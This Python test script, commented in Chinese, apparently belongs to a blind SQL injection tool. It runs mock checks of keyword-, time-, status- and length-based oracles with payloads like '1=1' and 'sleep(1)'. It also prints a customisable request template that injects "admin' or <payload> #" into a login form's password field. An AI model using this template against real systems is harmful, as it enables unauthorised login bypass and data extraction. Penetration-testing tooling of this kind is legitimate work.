#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
测试req函数设计

这个脚本用于测试和验证req函数的自定义设计
"""

import requests
import time

def test_req_function():
    """测试req函数的基本功能"""
    print("=== 测试req函数设计 ===")
    
    # 模拟不同的req函数实现
    print("\n1. 测试基于关键词的req函数:")
    test_keyword_based_req()
    
    print("\n2. 测试基于时间的req函数:")
    test_time_based_req()
    
    print("\n3. 测试基于状态码的req函数:")
    test_status_code_based_req()
    
    print("\n4. 测试基于响应长度的req函数:")
    test_length_based_req()

def test_keyword_based_req():
    """测试基于关键词的req函数"""
    print("   - 成功payload (1=1) 应该返回 1")
    print("   - 失败payload (1=2) 应该返回 2")
    
    # 模拟req函数
    def mock_req(payload):
        # 模拟响应
        if "1=1" in payload:
            return 1  # 成功
        else:
            return 2  # 失败
    
    # 测试
    test_cases = [
        ("1=1", 1),
        ("1=2", 2),
        ("sleep(1)", 2),
    ]
    
    for payload, expected in test_cases:
        result = mock_req(payload)
        status = "✓" if result == expected else "✗"
        print(f"   {status} payload: {payload} -> {result} (期望: {expected})")

def test_time_based_req():
    """测试基于时间的req函数"""
    print("   - 延迟payload (sleep(1)) 应该返回 1")
    print("   - 无延迟payload (1=1) 应该返回 2")
    
    # 模拟req函数
    def mock_req(payload):
        if "sleep" in payload:
            time.sleep(0.1)  # 模拟延迟
            return 1
        else:
            return 2
    
    # 测试
    test_cases = [
        ("sleep(1)", 1),
        ("1=1", 2),
        ("1=2", 2),
    ]
    
    for payload, expected in test_cases:
        result = mock_req(payload)
        status = "✓" if result == expected else "✗"
        print(f"   {status} payload: {payload} -> {result} (期望: {expected})")

def test_status_code_based_req():
    """测试基于状态码的req函数"""
    print("   - 成功payload 应该返回状态码200")
    print("   - 失败payload 应该返回状态码500")
    
    # 模拟req函数
    def mock_req(payload):
        if "1=1" in payload:
            return 1  # 模拟200状态码
        else:
            return 2  # 模拟500状态码
    
    # 测试
    test_cases = [
        ("1=1", 1),
        ("1=2", 2),
        ("sleep(1)", 2),
    ]
    
    for payload, expected in test_cases:
        result = mock_req(payload)
        status = "✓" if result == expected else "✗"
        print(f"   {status} payload: {payload} -> {result} (期望: {expected})")

def test_length_based_req():
    """测试基于响应长度的req函数"""
    print("   - 成功payload 应该返回较长响应")
    print("   - 失败payload 应该返回较短响应")
    
    # 模拟req函数
    def mock_req(payload):
        if "1=1" in payload:
            return 1  # 模拟长响应
        else:
            return 2  # 模拟短响应
    
    # 测试
    test_cases = [
        ("1=1", 1),
        ("1=2", 2),
        ("sleep(1)", 2),
    ]
    
    for payload, expected in test_cases:
        result = mock_req(payload)
        status = "✓" if result == expected else "✗"
        print(f"   {status} payload: {payload} -> {result} (期望: {expected})")

def demonstrate_req_customization():
    """演示req函数的自定义"""
    print("\n=== req函数自定义演示 ===")
    
    print("\n用户需要根据目标环境自定义req函数:")
    print("""
def req(payload):
    # ========== 用户自定义区域开始 ==========
    
    # 1. 目标URL - 用户需要修改
    url = "http://your-target.com/login.php"
    
    # 2. 请求参数 - 用户需要根据实际情况修改
    data = "username=admin&password=admin' or "+str(payload)+" #"
    
    # 3. 请求头 - 用户可以根据需要修改
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    # 4. 代理设置 - 用户可以根据需要修改
    proxies = {
        "http": "http://127.0.0.1:8080",
        "https": "http://127.0.0.1:8080",
    }
    
    # 5. 发送请求 - 用户可以根据需要修改请求方式
    r = requests.post(url=url, proxies=proxies, headers=headers, data=data)
    resContent = r.content
    
    # 6. 判断逻辑 - 用户需要根据目标系统响应特征自定义
    if "登录成功" in resContent.decode('utf-8'):
        return 1  # 注入成功
    else:
        return 2  # 注入失败
    
    # ========== 用户自定义区域结束 ==========
    """)

def main():
    """主函数"""
    print("req函数设计测试")
    print("=" * 50)
    
    # 运行测试
    test_req_function()
    
    # 演示自定义
    demonstrate_req_customization()
    
    print("\n" + "=" * 50)
    print("测试总结:")
    print("✓ req函数设计允许用户完全自定义")
    print("✓ 支持多种盲注类型")
    print("✓ 返回值统一：1=成功，2=失败，3=错误")
    print("✓ 用户需要根据目标环境修改req函数")
    print("=" * 50)

if __name__ == "__main__":
    main() 